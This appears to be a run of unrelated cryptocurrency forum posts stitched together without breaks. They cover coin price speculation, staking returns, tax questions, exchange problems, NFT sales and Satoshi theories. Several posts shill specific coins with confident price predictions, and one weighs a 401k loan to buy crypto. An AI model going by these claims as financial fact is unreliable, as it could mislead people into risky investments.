Out of curiosity I checked the price today and was shocked to see it hovering around $0.22 as it has spent most of the past 2 years at $0.05 or so. Taking a look at their website and Twitter page it seems like they are bustling with updates, expanding their team, and even offering crypto invoicing/payment solutions.

Currently the market cap sits at $227 million. Am I missing something or could this thing x10 with a bit of marketing and exposure?

Hello everyone, 

I got into crypto late 2017 during that first crazy bull market. I started out with BTC and ETH, and then went down the shitcoin rabbit hole. I joined cult like groups and invested my life savings (about $65k) into a few projects that ended up being absolute shit. I was invested heavily in one coin that was on Cryptopia exchange. The exchange ended up going under and I lost all my funds on there. I had a small amount on an outside wallet and sold it recently at a 99% loss. For the other coins, I was using Binance, but I live in the US, so they eventually locked my account and I am not able to retrieve my funds. 

As you can imagine, I was devastated on losing my life savings. I lost a lot of sleep and had very stressful times because of the horrible decisions I made. I thought I would never recover from the loss. However, I saw an opportunity at the beginning of 2021. I slowly started investing in BTC and ETH and am getting closer to breaking even on my 2017-2018 loss.

My questions is -- when I report my taxes for this year, I will have a gain of $30k-$60k, depending on where the market ends up. However, I never reported my losses from 2017-2018 because I was never able to pull out my money. Is there a way I can report my losses with my gains?

Any help would be greatly appreciated!

Would this cause tax issues or average cost issues somewhere? Or some other kind of confusion? For example if I have LTC on binance and then I buy more on coin base. Is this allowed? Will it make things easier if I acquire it completely on one? What if the prices are different? This strategy makes me consider if doing it all on the same exchange makes improved sense. I guess you could move them from your first exchange to the other so maybe it doesn't matter. Some vehicles aren't even available in some locations so maybe you have to do this

Good day to you all!  


There is one detail I am not sure about when it comes to taking profits, so I am curious to learn what strategies do you, kind people, use.

Let's imagine that you are investing in a project with strong fundamentals. The project has a real use case and a bright future and you've been DCAing into it every week. 

That project just pumped (did a 2x or so). And as per some strategies, it is time to take out some profits (10-20%), because there's a risk of a bear market or a quick crash which could make that pump irrelevant and bring you back into the red. 

However, as you do that, what happens to your DCA? It seems weird to sell a percentage of a bag, just to buy some of it back in a few days. 

Another option is to go from "DCA In" to "DCA Out", but that would mean not investing in that project for a while, even if that project still has potential.

We are now in a bull market, so having a strategy for taking profits is especially important. However, it's not easy, so if someone found something that works, please educate us!

Cardano smart contracts have been out for what like two months now? Name a single application built on Cardano. I'll wait. Regardless of what you think about SOL (I have my opinions on it), I'm surprised it took this long for it to flip Cardano. The Solana ecosystem has far more things than Cardano's and actually has apps built on it. Not sure how Cardano's market cap reached what it is given what Cardano is right now. But then again with SHIB and DOGE up there no one really knows shit about fuck.

I been talking to a couple friends who are very involved in the crypto space and understand many of the security risks behind smart contracts. They say that many projects today do not longer use multisig wallets and instead use more complex voting mechanisms. Is that true? I feel like many projects I am involved in still use multisig, but I am wondering what could be more secure and efficient.

For those that don't know what multisig is feel free to read this short article

 I only found this today and thought I'd share another way to make some free money even if its not much.

Bat (Basic Attention Token) was create by Brendan Eich who created JavaScritp, Mozilla and firefox the brave browser is pretty smooth and blocks unwanted  **Trackers &amp; ads** and while using this browser you can earn Bat crypto [https://coinmarketcap.com/currencies/basic-attention-token/](https://coinmarketcap.com/currencies/basic-attention-token/)  

***4 Ways to Maximize your Brave BAT Rewards***

\#1 Do everything in Brave

The more time you use the browser, the more frequently you will see ads and earn BAT. So firstly ditch Chrome, Firefox, Safari, and Edge completely, and also avoid using apps for things you can just as easily do in the browser. This comes with a lot of security bonuses as well, since apps from Big Tech love to track and sell your data, while viewing those same sites in the Brave Browser instead will block all that tracking and invasion of privacy from happening, which is probably what got you interested in Brave in the first place.

\#2 Leave Brave Running

By leaving the browser up and running, you'll be served adds via popup notifications every 15-30 min, whenever you re-focus the app. So instead of closing and reopening the browser all the time, just leave it up and focus it when you need it again. (Also, make sure your notifications are enabled in order to see and earn BAT from the popup ads)

\#3 Increase Ads to 10 per hour

Make sure youre running the latest version of Brave, go to Brave Rewards settings, and set the ad count to the maximum 10 per hour, doubling your BAT earnings.

\#4 Use Brave on All Your Devices

Currently you can link your Uphold account to up to 4 wallets . So make sure you're using Brave on your desktop, laptop, work machine, and phone (only Android, sadly iOS doesn't allow you to keep your BAT). If you funnel all your internet interaction through Brave, you'll passively be generating 3 to 4 times the amount of BAT you would typically.

BONUS: Earn Interest on your BAT

This one's not so much related to Brave BAT Rewards, but once you've earned your BAT, consider depositing that into an account that's generating interest for you passively. A few platforms to check out for this are Celsius, Gemini, and BlockFi. Once you've got your BAT in your Uphold wallet, send it to one of these platforms and it can start earning around 3.5% APY without having to lift a finger. At the time of this post, the rates are:

* Celsius 3.51% APY on BAT
* Gemini 3.49% APY on BAT

A while back I got an account with Crypto.com and goes far have had no issues. The account is gone everything I want to have accumulated a lot of SHIB before the price went way up like it has. 
That being said the other day I bought $100 USDT worth of tether with the intention of transferring it to PIONEX. I did so and once the funds appeared $25 out of the 100 was gone. Apparently they charge a big fee which is absolutely ridiculous to transfer to an external wallet. I know its another articles and people have come across, theyve mentioned Either purchase different, cheaper Crypto and transfer it like that to avoid the big fees. Having not tried this yet, does anyone know if this holds true? Any other advice besides get rid of this company or get rid of that company would really be appreciated because Im still learning? Thank you in advance.

Like most of you I followed crypto early on but never really got into it until maybe a year or so ago.

Im very impressed with blockchain. I truly feel it is a technology that could and will change how many things like public records will work.

But at the same time I feel Im just going to get screwed with crypto coins. Its like the damn Wild West out here. Coins popping up and vanishing every single day. Dogs and cats living together. Mass hysteria!

I have some cash in Ether and Bit. My meme coin gambles have gone the way of the Dodo Bird. Poof. Im just waiting to get screwed again. My brother in law lost everything by taking on leverage. Idiot. If you look back on my posts you can see the story. 

Anyway, my god damn barber was telling me about crypto a few weeks ago. I truly feel we are about to get screwed. Anyone else? 

Good luck all!

I have always been interested in arbitrage; retail, or crypto. I recently stumbled upon flash loans, and was very interested in the idea of it. The idea of flash loans is that you borrow an unlimited amount of cryptocurrency, swap for another cryptocurrency/token then pay back the original cryptocurrency; all within the same transaction. I messed around with some cubes on a specific website, but always seemed to lose money in the end. Has anyone actually made a profitable transaction using flash loans?

Finally Cardano is moving! So happy to see my phone vibrate and send me notifications of ADA rallying up. Obviously not a lot, a marginal 5% but hey better little than nothing!

Proof: http://imgur.com/a/qwzlyyJ

I think it's just the starting and ADA will definitely blow some roofs in the sphere. I don't have crazy speculation but I'm aiming at least for a 2x in this current bull run. I know, ballsy!

So what's your price predictions for ADA and what do you think will drive us there ?

Ps: The community too is fantastic and I want to thank  all the diamonds hands that kept tight during those past times.

ADA to the F Moon

I was thinking about sending this suggestion to Coinbase and a few other exchanges I use. I doubt it will happen, but in the USA we are taxed on the value of the crypto we get at the time we get it while mining. 

Exchanges could have static addresses per account, and from there if we use those addresses to deposit coins. As soon as it hits the account it sells it or swaps it for some stable coin. 

A side function is we could have it auto swap to another coin. Like if some coin stakes on the exchange we could auto swap whatever to it.

&amp;#x200B;

The advantage to this is realistically you shouldn't have to worry about both a capital gains tax and a income tax since as soon as you get it the coin is swap to some stable coin or sold.

&amp;#x200B;

What is your thoughts on this? Would you use it if you mine?

Where can I stake my Cardano for a good return %? I buy my ADA on the crypto.com exchange and try to stake it there but Im only earning 2.55 ADA for 6,635 ADA weekly. Is there a better alternative for me to Earn More Cardano? Feel like Im doing myself a disservice by staking on crypto.com

Ive staked my Cardano for 6 months and only earning 64 ADA total. They have a 2% p.a on Cardano and that seems pretty low! Any suggestions and recommendations are appreciated

It's only a matter of time before cryptocurrency completely replaces traditional money because it's the currency of the future and blockchain technology is super advanced and computers is a form of technology.

Cryptocurrency is super stable and definitely something I'd want to store my wealth in and use for all my purchases including the grocery store because literally everyone accepts it and it's really advanced and is technology using computers.

I'm really glad the geniuses made it because you can do anything with science and technology/ STEM to improve our lives endlessly. Blockchain is super smart and useful for currency because it's a chain made of blocks that are using computers to do cool stuff with monies.

This is why I'm putting all my money in PooCoin instead of the bank.

 I stumbled across Epic Cash while looking for a relatively unknown, cheap privacy coin, that had the potential to go parabolic. I was blown away with what I found in Epic Cash. When you listen to the founder (Max Freeman) of this project speak, you get the sense that he genuinely considers BTC (Bitcoin), as just a stepping stone for Epic on the way to infinity.

Epic on its it own is by far the best private and fungible crypto that that Ive come across. The use of Mimblewimble for privacy, fungibility and scalability is a great choice. Add in the speed in which it will be able to process transactions then you already have something that not too many other projects will be able to compete with.

Another feature is its approach to mining. Egalitarian means fair for everyone. The mining algorithms being used in this project are unmatched by anything else. Everyone who has a computer can mine Epic if they want to. And at some point in 2022, everyone who has a mobile phone will be able to mine Epic if they want to.

Currently, Epic has 12.5 million coins in circulation, with 11,520 new coins being created every day. The next halving is in October 2021, when only 5,760 newly created coins will be coming to market per day. The halvings in Epic will happen every two years until The Singularity when only 210 new coins per day will be coming to market.

The high inflation at the beginning of Epics life cycle means that you can still get Epic Cash for very cheap. If you put $10k into BTC you cant even get 0.25% of 1 BTC out of 21 million. If you put $10k into Epic you can obtain over 0.15% of the entire 21 million coins that will ever be in existence. (Based on current prices of $43k for 1 BTC and $0.33 for 1 EPIC).

**How does Epic achieve Privacy and Fungibility?**

The tech that Epic uses to achieve privacy and fungibility are Mimblewimble, CoinJoin, Cut-Through, Dandelion and Tor.

Hi Kids. It's me again.

  Well, for no other reason except pure spite, I 'invested'  in a few crypto 'currencies' - or whatever they are supposed to be - (still not real clear on that).  Long story short, I doubled my money within a couple of days. And it was beautiful.  

 So...my recent experience  now begs the question: ***Why buy stock when you can buy crypto?***

I do make a distinction between investing and trading.  I invest in my IRA.  When I trade, as often as not, I don't know or care what the company is or does. I merely memorize a trading range, buy big on dips and dump on the bump. 

Here's the brass-tacks bottom line:  When you strip the bullshit from the buckwheat, I'm getting the same adrenaline buzz from crypto, it's open 24/7, the volatility is crazy and the action moves a hundred times as fast.

In other words,  I have come over to The Dark Side.

I'm just curious how the people in this sub deal with what could have been the opportunity cost of hodling more if you didn't sell. 

- Example selling Harmony ONE at 0.1 when now it's close to 0.3 (missing a 3x)

- Veterans who bought bitcoin for cheap below $20,000 and sold way below where we are now...

- Ethereum bought at $300 sold at 1k and now its breaking ATH at above $4.5K

How do you deal with that and feel bitter. Do you fomo in again ? Care to share your secrets with us. I know we say DCA in and DCA out but you still lose some in the way.

 What are your thoughts? I'm pretty hype for some games in development, I've only recently been reading up on the space and want to know your opinions.

  I'm personally excited to play Guild of Guardians, Project Quantum, Ember sword and Influence. I'm not so keen on the current state of P2E games, although there are some solid games out right now (Crypto Royale, Coin Hunt World) most of the others felt like a waste of time or have a high barrier to entry. I don't have any experience with any real metaverse games like The Sandbox or Decentraland, please let me know your thoughts on those and those alike as well!

I just sold a "little" ETH trying to make a bit of profit from the price fluctuations. At 4538, after all it was still at a very good price and the chance that it would drop a little bit more was definitely there. But as soon as I hit that sell order someone bought 1.6k ETH and I just watched thinking about my genius move. Couldn't help but feel like they are tracking our moves/s, but hey it's going up again. Thank me later and buy me a Lamborghini if the price never drops bellow 4538 again. Taking one for the team sure feels nice.*crying inside*

Which coin is next to jump +50%?

Ive been seeing a lot of coins jump very quickly and wondering which coin you guys think is next? (Ex. Loopring, ethereum, etc)

I know timing the market is impossible but theres still gotta be some coins that have not made significant gains yet. 

Drop your favorite coins below. I prefer ones that can be bought through Coinbase as that is where most of my holding is.

I currently have eth, matic, enj, mana, and ada. Should I just stick with what I have for now and wait or add something else?

Random ramble advice from semi-og: This is my third ride to the moon, I've crashed twice before, but finally hit the elusive 2 comma club! I've been a trader, a miner, a node operator, a staker, a liquidity provider, and an NFT collector. I've been called crazy, lucky, and stupid along the way up and down the rollercoaster over nearly a decade of crypto-ing. There was a lot of sleepless nights of research, but the dedication is paying off and my hobby has turned into a home for my family and a path to financial freedom.

My formula is pretty simple at this point, buy and hold good projects with top notch development teams... try actually using crypto as intended (staking/defi/nfts); your user experience is generally good investment advice (believe it or not, crypto was meant to be used, not just hoarded). Also, patience is generally rewarded and you don't need to go digging past page 3 of cmc to do well in the market lol.

Having said that, it can take more than one cycle for the gainz to stick, it can also take more than one cycle to find your right approach to the market... and knowing when to leave the party is probably harder than the ride up. While it does look like we are in for quite a good Nov-Jan run, remember to stack profits where you can! You're likely not going to get rich if you are just joining the party, but you can put yourself on better financial footing for when the time to load up comes again (aka crypto winter). 

Navigating the bottom seems far from everyones mind, but it's the most important time if you're going to see life changing money. The misery train down will feel endless after the impending euphoric rise, but when the dust settles, DCA is the way. You will also want to be earning yield anyway you can (staking/lending/diversified dex LP). I'm 50/50 between expanding cycle theory and 4 year cycles, the investment delinquency seems to be at an all-time high paired with inflation fears, so we may fall closer on the 4-year predictions at our current rate even though the data science is stronger for an eoy 2022 peak. Anyways, cheers and good luck on your own crypto journey! Any other multi-cyclers out there?!

Hi everyone, I am hoping for some advice on which platform/app I should use for a "lottery" type of investment.  

I have my serious coins on Coinbase pro, but I would like to pitch a few dollars here and there into some of the "shitcoins/memecoins". 

 I am in the US, so I am having a lot of trouble finding any platform that carries most of the ones I think might be a good payoff. 

I know most of it will end up going down the rabbit hole forever, but I am not dropping a grand on them, more like $5 - 10.  If I get lucky, great, if I lose it, it's still got better odds than the lottery.  

Any advice and/or experiences about different apps or platforms would be appreciated.  

Also kind of a noob so I'm probably missing something extremely obvious, but it would not be the first time.
Thanks in advance

I sent myself USDT from binance to Bitmart via Solana network. And it never arrived. Whats going on? I thought maybe I screwed up so I tried it again with small amounts of USDT and USDC, again, never arrived. I thought maybe its because of Solana network so I tried sending it to Bitrue exchange and then it arrived perfectly fine. Also tried using Tron network to send to Bitmart and it worked. But using SOL network to deposit into Bitmart has put my funds into limbo.
Is anyone else experiencing this? Let me know if you get around to trying it. Definitely send the minimum amount though.

You may have  seen the 2-3 pump Origintrail experienced today as a result of their listing of their listing. Well i am here to tell you that i believe that TRAC has alot more room to grow in the future and i wouldn't be suprised if it eventually overtakes Vechain.

Origintrail is the world's first Decentralised Knowledge graph that is used to make assets easily verifiable and discoverable enabling easy data sharing between companies, organisations, People and AI. This obviously has massive use in supply chain logistics, Asset ceritification, global food markets, information metrics, global data standards, data sharing and marketplaces etc. Just an example it currently has been adopted by Walmart, the department of homeland security and home depot

The trac token used as collateral to help ensure honesty and immutability between the decentralised data node network and as a means of monetizing data holders

TRAC is a web 3 protocol designed with interopability not just between various blockchain ecosystems but also legacy supply chain systems/data standards. Since it serves as a middle layer it is therefore multichain allowing anyone to build on it. It is currently connected to the ethereum, polygon and xdai ecosystems and will be on polkadot once parachain auctions are out (through PARITY)

The only two notable  centralised exchanges TRAC is currently available on Are Kucoin and coinbase (launched today). It still has to release on the likes of Binance, FTX, kraken etc. 

As of the time of writing the mcap is 1 billion dollars. As more adoption and more exchanges list TRAC ( very likely more excchanges will follow in coinbase's footsteps) i can only see the price going up in the medium to long term. I hold both vechain and origintrail and like both but at the end of the day i feel origintrail has the better growth  narrative.

I was using Okex, I was trading on the perpetual futures specifically the Theta/Usdt pairing. I had a conditional stop loss order that market sells my coins when a certain price is triggered say 7.40. The price went below that and none of my coins were sold. I specifically used a market sell function so that there will not be an instance where the prices go further downwards due to volatility without selling. Market order means to sell an any price right? 

I am really confused and lost about $2k because of the stop limit not working. I had to manually close the order myself to cut the losses. Has anyone encountered such a problem before?  

I am very disappointed that a top exchange like Okex has such problems with their exchange. I would caution anyone who intends to use them in the future.

Waking up to the news that Commonwealth Bank is getting involved in crypto, allowing traditional banking customers to trade directly in its banking app, through the help of Gemini. 

On one hand, I think this is great step forward, yet on another, I am kind of unsure if this goes against the whole concept of decentralization.

What's everyone's thoughts on this? I assume this will make moms &amp; dads investors to easily dip their toes into crypto without too much of a learning curve, so that should theoretically bring new money into the space, so cam potentially prop the entire crypto market up. But on the other hand, are we potentially turning crypto into another share market through this kind of mainstream involvement?

Curious to hear both sides of the argument.

So as per a previous post, I was caught out by the not able to sell anything in my country issue on Coinbase however the lovely people of Reddit showed me the way around it.

However now there is another problem.

I transferred the coins to a suitable coin and started the transfer.

I used the correct address to the new location and the transaction has now completed.

My issue is that the other side require me to lodge a manual transaction that includes the TXID and the amount.

I have the amount however the transaction record just shows
Name of the coin
The amount sent
The value
Date 
Time status thats now notes completed.

No TXID so I cant lodge the manual transaction so cant collect the funds.

What do I do now?

My goal is to stake Crypto. I plan to hodl as long as I possibly can. I am young, financially stable and just want to make smart decisions that 10yr me from now will be stoked I did. 

I got into crypto in April 2020 so pretty new, trying to learn as much as I can and I hold a variety of coins including: BTC ETH XRP XLM MATIC ADA in order of highest invested fiat. 

I buy through Robinhood (I know gross but its how I got started initially, is easy and Im not an expert so dont burn me at the stake please) and Uphold. 

Any and all advice on how to stake is much appreciated thinking of either Nexo and/or Edge but Im not knowledgeable enough about them or the possibilities.

What I find interesting is that the NFT is tied to the physical tungsten cube. If the NFT is burned, the cube gets shipped to the NFT owners. 

Tricky thing this NFTs tied to physical assets. What happens the company goes bankcrupt?

Does anything think that there are possibly 1,000's of people/machines currently running trying to brute force the private key to an original Satoshi wallet?

&amp;#x200B;

I think to the "lost" BTC in countless wallets.  People that mined in the early years, had 100, 8000, 50 BTC whatever the amount, threw away their old laptop or for some other reason just can't recover the private key.  Are these wallets 'fair game?'

&amp;#x200B;

Perhaps we should create a registry of known lost wallets that are eligible for attempted brute-force cracks?

&amp;#x200B;

I'd run that program in the background if it was allowed.  Does this currently exist?  Is there a market for it to exist? 

&amp;#x200B;

Think of it like they crypto powerball.

&amp;#x200B;

Perhaps this is more common than I'm aware of and just haven't researched it enough.

I started dabbling in crypto at the end of 2020, so I'm fairly new to everything and I'm still learning. Still, even as a noob, it's easy to see that there are some extremely exciting things happening in crypto right now. The trouble is that I'm fairly bad at conveying to other people why many cryptocurrencies have real world utility and why it isn't just monopoly money or a passing fad. 

So how do you guys win people over? What are some of your favorite examples of utility and how do you see it influencing our future?

Let me start with Legality of Crypto in India. There have been rumours about the ban of Crypto in India because it is "Bad for Ruppee " but the ban never came through. I like to believe that massive Crypto donations during pandemic could be a small reason to not ban it. For India, according to advertisments, it's an *"unregulated digital currency and not a legal tender in India. It is subject to price fluctuations and other market risks"*

**CoinDCX** 

Getting to the main point,

The advertisement industry is massive in India, and the magnitude of influence these advertisements have on thr population is mind blowing. Mostly celebrities and famous sportspersons are signed for doing any kind of advertisement, and bigger the celebrity, bigger will be the hype of the advertisement. 

The competition of making better advertisements and signing bigger celebrities to promote their brands and products is never ending. WazirX was early in joining the Crypto world and was limited to only the population who knew about crypto. CoinDCX on the other hand has been advertising at a very large scale from newspapers and social media to TV ads and posters. It has signed few of the biggest names in Bollywood and there are speculations of even bigger celebrities. 

Die hard fans, and other viewers will simply sign up and buy crypto because their favorite actor asks them to. On the other hand, a very popular figure Salman Khan also started his own crypto. His fans are absolutely crazy and will follow him till the end. 

More and more celebrities are walking into crypto and that becomes a breaking news! 

Having the second highest population on the planet, India entering Crypto will have a massive impact in the Growth of the Crypto Market and Adoption.

**TLDR**

Biggest Celebs advertising CoinDCX way too much now. Very very bullish for the market and adoption. 

I have nobody else to discuss this with :/ So yeah. Thanks for reading!

There's been tons of talk about FB's metaverse all over the internet, some says its just a rebrand to  divert attention away from their privacy issues, nevertheless I personally am pretty excited about the metaverse in general and I think its pretty revolutionary. Of course having a decentralized metaverse is ideal and would be preferred by everyone, but I don't understand why people are banking on NFT projects such as SAND and MANA to beat Meta in a way. SAND and MANA at the end of the day would just be another Roblox or Minecraft without the proper tools for users to access the "metaverse".

As in tools I'm referring to the Oculus or the fancy metaverse glasses that Meta is trying to make. Correct me if I'm wrong but I don't think there's a way where people can fully experience the metaverse without a centralized company to produce the products. Of course, there would be some small indie company that solely sells glasses/ equipment to the metaverse but they wouldn't have the cash/ resources that Meta has and I feel like "he produces the key to the metaverse, controls the metaverse". As much as we hate Meta and Zuck, they're gonna be a vital player in the metaverse. 

DISCLAIMER: I don't know jack shit and am not a Zuck shill, just here for some opinions. Cheers! 

TLDR, Future of metaverse is in the hands of Meta and projects like SAND and MANA would be at the mercy of Meta

So I was trying to come up with some ideas to help educate others about crypto. Even more so if the person we are trying to educate holds some major power like a political person.

Anyways, I want everyone's thoughts on this.

What is your thoughts on us finding the experts in crypto that is actively on here, and having an open chat for verified political people or those with power to ask us questions. The only ones that can ask questions is those who have been verified to work for some political person or someone else with power. Or those in power themselves. And those who can answer questions is those who have been verified as some expert. An expert being developers, people who are verified to build things with/around crypto (including metaverse/games), those who are verified in TA (we need some for the investment side. Obviously I would put myself up on this), those who are verified to own or work in exchanges, some users of crypto outside of money making, and so on. (NOTE I think it would be smart to have hundreds to thousands of experts due to the next part)

&amp;#x200B;

Now, what is your thoughts on this happening every Friday or some extremely regular event? Basically it can be extremely well known if the powers want to learn more and work with us. We do regular events in which they can ask questions.

(The reverse AMA is where instead of the many asking the few some questions. It is the few asking the many questions)

&amp;#x200B;

# NOTE

With this we can get a smaller group of experts which can work with political people in writing bills. Where they can call on us for help to make sure given things won't harm the industry or where they can ask questions about a bill they are making to see our thoughts on how it could change things in crypto.

So obviously BTC is the grandaddy, and ETH is the dad. Let's have a look at some of these other top 50 children :)

BNB: I'm not interested, Tether: I keep tether for as little time as possible trading, mainly trade by flipping alts around and cheeky short-term margin trades.

SOL: don't know a lot about it but I own some

ADA: I own ADA but I'm not sure it will the ETH killer

DOT: \^

Ripple can suck my decntralized balls

SHIB/DOGE..... holy crap. I honestly dunno what to think about these. I guess the hype train could continue, but for how long who knows. they might stay up in the top 20 for a few years simply from e**X**treme hype, but i don't touch 'em

ATOM: pretty cool, hodling

ICP: pretty shit, hodling

CRO: good potential, i'm staking CRO and have a crypto dot com VISA card, many people will want to use top-up crypto debit cards so i'm bullish on CRO

Swappy coins: (CAKE, UNI, SUSHI etc,)  wicked concept, **M**ost people just speculate on the tokens though and don't use the netwo**R**ks much.

NFT/Gaming coins: Viable concept, I own MANA, ALICE, ENJ, reasonably bullish

Privacy coins: fight club innit, read between the lines

Peace my crypto friends, may the moon smile down upon you.

Im old enough to remember when the dog coin that mooned was Doge coin. It hit 0.73 on May 8, dropped to 0.30 by May 30 and is currently at 0.27. Many meme coins made huge gains during this time followed by massive corrections. Shiba just made a similar move up as Doge and may be in a similar downward pattern. Dog coins  and now, CATS!  are now mooning with 30,000x returns in some cases.


The April/May meme coin season also followed the first NFT wave  remember people buying Tweets?  culminating in a $69 million Beeple sale on May 11. NFT prices crashed soon after. Weve just seen a huge run up in NFT prices and adoption, this time in generative PFPs, and have already seen a marked cooling off in those prices.

Bitcoin itself hit an ATH on April 15, around $63,000, then hovered between $50,000-$60,000 for several weeks before crashing to $29,000, bringing the rest of the market with it. It just hit a new ATH of $67,000 on Oct. 20 and has hovered between $58,000-$64,000 since.

Stay safe out there.

Hi everyone I just made a account finally been lurking for a long time but decided to see how this moon and vault thing works what should I do ? I always heard so much about them always and how people are buying them to become moonilionaries are they really going to be worth that much in the future?

Hey guys! 
Ive been into crypto for a year now, and i really love it! This subreddit also helped me a lot. But i've seen a lot of people talking about "moons" and collecting them. I've set up my vault, but am a bit stuck right now on how it works. Do i have to get premium, or how does it work? Cause i know you can get premium with moons, but then again i dont own any. I really hope someone can help me with this, because I really love the community and hope to get even more invested instead of being a lurker and just reading all the time :p

Thanks in advance!

If you are in your teens- Congratulations, you are already doing better than 90% of others out there.

&amp;#x200B;

When you are young your initial corpus is tiny. No matter how hard you try and time the market and be an amazing trader your gains will still be less. 

If you start with 100$ and make 500$ out of it, it is great but it is very hard to consistently get such returns. The best thing you can do is to invest in yourself which gives the highest ROI. The problem here is putting in the labor which is required to get a 6 figure job. Most people would rather be sold on promises of finding the next 1000x coin.

Picking up it as a hobby and making passive investments- buying and holding is the best method. Don't invest both your time and money into the same place- you're not diversifying then. Invest your time in learning new skills, which helps you with bringing in more money for your portfolio and investments.

We being in this echo chamber it is very easy to get trapped in the dreams of when lambo. Invest in yourself and your career. You are at the markets mercy if you don't have any skills. 

One must start investing with your first salary and keep making regular investments. Keep in mind that in the current state the fiat mines are the only place which guarantee you a steady income.

Some of the biggest names we see in this space will not exist in the next 5-10 years. It is not going to be a rosy path ahead- nothing is too big to fail. Ethereum in its current form will fail to bring in new developers or even keep the current developers at bay for long. There will be plenty of new projects for you to get good returns- focus on building your career right now. 

&amp;#x200B;

1. Invest as an investor and not as a gambler.

2. Invest in yourself as a priority.

3. Don't be jealous of others- opportunities come and go- your time to shine will come but you must be prepared for it.

I just came across this project that actually pays you in their token for cleaning up beaches. According to their site it was started by a couple of surfers. It's called Clean Ocean Token. 

You apparently just have to pick up trash on a beach and email them with:

 1. your Algorand wallet address

2. Photo of you and the trash you removed with sign that says "FISH"

3. estimate of the number of pieces of trash you removed from ocean

4. Yes or No if you would want to be featured on the website with your picture on your cleanup

I DO NOT live near the freakin ocean so I can't try this. Will someone try it out and see if it works?

Their website is [https://cleanoceantoken.org/](https://cleanoceantoken.org/).

I bought a tiny amount of their token on the Tinyman exchange to support the project, but I'm otherwise unaffiliated.

*Confession*

&amp;#x200B;

I have a confession to make.   I used to be active on /r/buttcoin.

&amp;#x200B;

For a long time I had huge doubts on the value of cryptocurrency and didn't bother to see the other side.   I thought it was all a joke, and just one scam after another.

&amp;#x200B;

*Conversion*

&amp;#x200B;

Until the middle of last year.    I joined this subreddit. 

&amp;#x200B;

I lurked for a few months.    I wanted to see a balanced view of cryptocurrency, so I had to see the other side of the equation.    Yes, there was nonsense spewed out by those shilling their coins, but there was also many who posted logical and reasonable posts and comments that discussed the utility and value of cryptocurrencies of many different coins.

&amp;#x200B;

And little by little, I was convinced of the value and utility of cryptocurrencies.   I was converted.

&amp;#x200B;

*Redemption*

&amp;#x200B;

Not only did I start buying crypto late last year, and eventually building a 4 digit portfolio over the past year, 

&amp;#x200B;

I also started posting here and as of today, **the total karma I earned here surpassed the karma I earned in that other subreddit.**     /r/cc rules the roost now and pushed that other sub down a notch.   Booyah.   My goal is to eventually have /r/cc at the top of my karma list - but the next few subs will take a far longer time to do.

&amp;#x200B;

I'm going to continue posting and learning more here, and I'm grateful that I had the chance to do so.

I still think there are a lot of scam coins (like that squid game one) - but there are lots of great coins and projects.

Beeple's "Mike Winkelmann" NFT Everydays: the First 5000 Days was sold for 42,329 Ethereum back in February 2021. 

The buyer Metakovan paid roughly $69 million at that time as ethereum was worth around $1600 each.

But recently due to the Ethereum making all time highs of $4500 per coin, the NFT is now worth $190 million dollars.

That would make it the second most expensive artwork in the world just below Leonardo Da Vinci's Salvator Mundi which was sold for $450 million.

It's just crazy how a digital art has already broken all barriers.

Well fellow SHIB owners it is 12:05 Wednesday November the 3rd and no SHIB on KRAKEN, I personaly have a KRAKEN account and I will be shutting it down as I believe all fellow SHIB investors should do also. I believe there is strength in numbers and that is why SHIB has risen to the 9th most powerful crypto currency in the world, obviously Kraken and Robinhood have been seeking media publicity and have lied to SHIB investors to get it. If Elon had tweeted Robinhood or Kraken to list SHIB I am positive it would have been a done deal!

Mass adoption is very low, marketing is weak and the hype is nearly zero. 
I've never seen a post in this huge sub which was about NEO. 

Nevertheless, it is one of the fastest chains there are. I'm not sure about other details like dev friendliness and so on, but objectively, it is surely a nice dApp platform, but without any hype there will be no significant price movement. 
Its price has been sleeping the entire bull run since July.
On the one hand, this leaves space to climb, but on the other hand, I don't want to miss the future profits which are pretty much certain with coins like ETH.

Would you still consider it to be worth investing in? Why? Why not?

If this is verboten for some reason I apologize.
Just had an idea and wondered if its new and/or interesting.
What if this thread had a daily (weekly?) lottery.

Briefly- start with the first post by user x.  

People can send user x up to 10 moons. For every moon sent you get one lottery ticket.

Everyone who sends at least 1 moon (but no more than 10 will count toward getting tickets) is entered in the next lottery.  

The usernames who participated are gathered and entered into a numbered list. For each moon the username gets one entry, up to 10.

A random number generator chooses a number.  

The username with that number wins.

And the process repeats- people send moons to the winner, a list is created, a winner chosen, etc.

Feel free to ignore this. Im old, tired and high. Also Im too lazy to run such a thing so

Lets suppose someone has a few hundred thousand in their 401k and they want to take a loan out for 5-10k for investment in ETH 65% and BTC 35%.

With the loan, lets assume there is no penalty and you pay your self back with interest via payroll deduction at your choice of 12-36 month installments.

Purpose of this is to increase holdings for increased gains under the premise that the exponential gains weve been seeing in the crypto market exceed that of the return on the 401k (currently at 14%).   It seems that crypto is just touching the surface.  Its going to explode over the next few years.

What would say to this person?  Good idea?  Bad?  More/less money?

Okay youve seen the amazing gains so far.

The team seems amazing.

And its Japans first legalized Crypto. THE coin of Japan.

But why use it? 

The coin is basically used to keep your private data safe for companies that you would like to share specific data to. But to dive even deeper companies spend millions of dollars to keep data safe. Imagine how cheap they could now share that data safely without having to jump through so many hoops or paying for security and maintenance. That is the true power and use case why I believe this is much bigger than we think it is.

Also google the white paper it is super easy to read and great to find out details for yourself!

If it grows as fast as Sol this could easily grow to 15$ but who knows and price predictions are for the birds.

When Dorian Nakamoto was being questioned for being Satoshi Nakamoto, the bitcoin founder anonymously posted that he was not Dorian Nakamoto. 

However, as Craig Wright has claimed himself to be Satoshi and even tried to copyright the Whitepaper, we have not heard from Satoshi that he is not Craig Wright. 

So, that makes me conclude 3 things:

1. Satoshi is actually Dorian Nakamoto

Satoshi is Dorian Nakamoto. When everyone started claiming Satoshi to be Dorian, he just did not want to be known. So, he simply posted he was not Dorian Nakamoto. So, even if someone claims to be Satoshi, there is no need for him to clarify.

2. Satoshi is Craig Wright

Though I do not want to believe it, but, Satoshi not coming out and saying otherwise means there is a possibility that Craig Wright could be the anonymous Bitcoin founder. 

3. Satoshi is dead

The only way he has not reached out since 2014 means possibly he could be dead. 

Or, he could just be reading this post from somewhere and not having a damn care as he is one of the richest person in the world and his idea has been a huge success. 

Wherever or whoever you are Satoshi, you have our biggest respect!

I have an ok job, pays the bills but doesnt give me a ton of extra after, I get by I guess but its not lavish and I have to budget a lot ;  unforeseen things like car repairs or dental work etc; hits a bit harder and cuts into other bills.  There isnt anything I can think of that wouldnt be solved with having a good amount of money . 

My car is shit and old : new car with money

Most my aches and pains are from over working , less hard work or the ability to go get massages and stuff :fixed with money 

